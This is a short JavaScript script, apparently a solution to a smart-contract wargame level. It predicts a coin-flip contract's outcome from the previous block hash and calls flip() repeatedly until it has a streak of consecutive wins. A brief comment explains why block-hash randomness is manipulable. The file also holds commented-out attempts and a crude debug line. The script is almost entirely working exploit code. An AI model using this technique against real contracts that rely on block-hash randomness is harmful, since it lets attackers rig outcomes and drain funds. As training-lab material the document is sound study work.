/*Block hash:
Use of "blockhash": "blockhash(uint blockNumber)" is used to access the last 256 block hashes. A miner computes the block hash by "summing up" the information in the current block mined. By "summing up" the information cleverly, a miner can try to influence the outcome of a transaction in the current block. This is especially easy if there are only a small number of equally likely outcomes.
Pos: 22:41:*/ 
// setting divisor..
var FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
var lastHash;
var i = 0;
while (i < 9) {
  let block = await web3.eth.getBlock(await getBlockNumber() - 1);
  console.info(parseInt(block.hash));
  if (lastHash !== block.hash) {
    lastHash = block.hash;
    let flip = parseInt(block.hash) > FACTOR ? true : false;
    console.info(parseInt(parseInt(block.hash) / FACTOR));
    console.info(`predicted flip ${flip}`);
    await contract.flip(flip);
    // show wins
    await contract.consecutiveWins().then(function(balance) { wins = balance});
    console.info("wins:"+wins.words[0]);
    i++;
  }
}


let trano = {from : player, value : toWei('0.001'), to : instance, data : "0xcde4efa9" /* signature of recieve */};
await contract.sendTransaction(trano, function (e, r) {console.log(`err is ${e}`); console.log(`response is ${r}`)});
// for (var i = 0; i < 10; i++) {
//   // calculate blockvalue
//   // console.info(blockhash);
//
//   let block = await web3.eth.getBlock(await getBlockNumber() - 1);
//   if (lastHash == block.hash) {
//     revert();
//   }
//   let flip = parseInt(block.hash) / FACTOR === 1 ? true : false;
//   await contract.flip(flip);
// }

// 0x1d263f670000000000000000000000000000000000000000000000000000000000000001
// for (var i = 0; i < 10; i++) {
//   console.info("tits")
// }
// wins
await contract.consecutiveWins().then(function(balance) { wins = balance});
wins.words[0];
